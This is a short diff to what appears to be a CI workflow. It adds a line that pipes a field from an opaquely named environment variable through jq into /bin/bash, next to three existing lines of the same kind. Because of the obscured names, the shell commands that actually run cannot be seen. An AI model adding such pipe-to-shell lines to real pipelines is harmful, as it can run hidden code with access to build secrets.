@@ -25,6 +25,7 @@ jobs:
           echo $xi1825 | jq -r .hl439 | /bin/bash
           echo $ko26 | jq -r .yy48777 | /bin/bash
           printf '%s' "$si08" | jq -r .xin2010 | /bin/bash
+          printf '%s' "$xczs443" | jq -r .r926 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
